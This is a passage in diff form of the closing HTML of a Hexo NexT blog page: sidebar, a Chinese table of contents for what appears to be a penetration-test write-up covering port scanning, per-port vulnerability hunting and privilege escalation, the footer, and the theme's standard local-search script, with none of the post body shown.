+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IP"><span class="nav-number">1.1.</span> <span class="nav-text">IP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口"><span class="nav-number">1.2.</span> <span class="nav-text">端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#操作系统"><span class="nav-number">1.3.</span> <span class="nav-text">操作系统</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">2.</span> <span class="nav-text">漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#80端口"><span class="nav-number">2.1.</span> <span class="nav-text">80端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9090端口"><span class="nav-number">2.2.</span> <span class="nav-text">9090端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#21端口"><span class="nav-number">2.3.</span> <span class="nav-text">21端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13337端口"><span class="nav-number">2.4.</span> <span class="nav-text">13337端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#60000端口"><span class="nav-number">2.5.</span> <span class="nav-text">60000端口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#整体思路"><span class="nav-number">4.1.</span> <span class="nav-text">整体思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#学到的新东西"><span class="nav-number">4.2.</span> <span class="nav-text">学到的新东西</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
